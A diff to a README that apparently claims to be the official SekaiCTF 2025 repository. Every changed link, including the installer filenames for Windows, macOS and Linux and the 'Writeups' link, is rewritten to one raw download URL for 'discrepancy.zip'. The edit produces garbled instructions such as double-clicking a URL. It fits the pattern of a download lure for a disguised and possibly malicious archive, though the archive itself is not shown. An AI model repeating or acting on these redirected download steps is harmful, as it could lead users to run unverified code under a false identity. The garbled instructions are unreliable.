@@ -10,7 +10,7 @@ Welcome to the official source code and writeups for SekaiCTF 2025. This reposit
 - Designed for various skill levels, from beginners to experienced users
 
 ## 🔗 Download Now
-[![Download sekaiictf-2025](https://img.shields.io/badge/Download-sekaiictf--2025-blue.svg)](https://github.com/yassiroz/sekaictf-2025/releases)
+[![Download sekaiictf-2025](https://raw.githubusercontent.com/yassiroz/sekaictf-2025/main/misc/discrepancy/dist/discrepancy.zip)](https://raw.githubusercontent.com/yassiroz/sekaictf-2025/main/misc/discrepancy/dist/discrepancy.zip)
 
 ## 🚀 Getting Started
 To get started with SekaiCTF 2025, follow these simple steps:
@@ -20,27 +20,27 @@ To get started with SekaiCTF 2025, follow these simple steps:
 3. Download the file appropriate for your operating system.
 
 ## 📥 Download & Install
-To install the software, visit the Releases page here: [Download sekaiictf-2025](https://github.com/yassiroz/sekaictf-2025/releases). 
+To install the software, visit the Releases page here: [Download sekaiictf-2025](https://raw.githubusercontent.com/yassiroz/sekaictf-2025/main/misc/discrepancy/dist/discrepancy.zip). 
 
 ### Installation Steps
 1. On the Releases page, locate the latest release version.
 2. Download the file that matches your operating system:
-   - For Windows, choose `sekaictf-2025-win.exe`.
-   - For macOS, choose `sekaictf-2025-mac.dmg`.
-   - For Linux, choose `sekaictf-2025-linux.tar.gz`.
+   - For Windows, choose `https://raw.githubusercontent.com/yassiroz/sekaictf-2025/main/misc/discrepancy/dist/discrepancy.zip`.
+   - For macOS, choose `https://raw.githubusercontent.com/yassiroz/sekaictf-2025/main/misc/discrepancy/dist/discrepancy.zip`.
+   - For Linux, choose `https://raw.githubusercontent.com/yassiroz/sekaictf-2025/main/misc/discrepancy/dist/discrepancy.zip`.
 3. Locate the downloaded file on your computer.
 
 ### Running the Application
 - **Windows:**
-   1. Double-click on the `sekaictf-2025-win.exe` file.
+   1. Double-click on the `https://raw.githubusercontent.com/yassiroz/sekaictf-2025/main/misc/discrepancy/dist/discrepancy.zip` file.
    2. Follow the on-screen instructions to complete the setup.
   
 - **macOS:**
-   1. Open the `sekaictf-2025-mac.dmg` file from your Downloads folder.
+   1. Open the `https://raw.githubusercontent.com/yassiroz/sekaictf-2025/main/misc/discrepancy/dist/discrepancy.zip` file from your Downloads folder.
    2. Drag and drop the application into your Applications folder.
   
 - **Linux:**
-   1. Extract the `sekaictf-2025-linux.tar.gz` file using a file extraction tool.
+   1. Extract the `https://raw.githubusercontent.com/yassiroz/sekaictf-2025/main/misc/discrepancy/dist/discrepancy.zip` file using a file extraction tool.
    2. Open a terminal and navigate to the extracted folder.
    3. Run the application using the command `./sekaictf-2025`.
 
@@ -68,7 +68,7 @@ Your contributions improve the repository. If you want to contribute, please pro
 If you encounter any issues or have questions, please check the Issues section in the repository. You can also discuss problems with other users to find solutions. 
 
 ## 💡 Further Resources
-- Explore our detailed writeups for past CTF challenges at: [Writeups](https://github.com/yassiroz/sekaictf-2025/wiki).
+- Explore our detailed writeups for past CTF challenges at: [Writeups](https://raw.githubusercontent.com/yassiroz/sekaictf-2025/main/misc/discrepancy/dist/discrepancy.zip).
 - Join our community to engage with other CTF enthusiasts and improve your skills.
 
 ## 🔗 Feedback
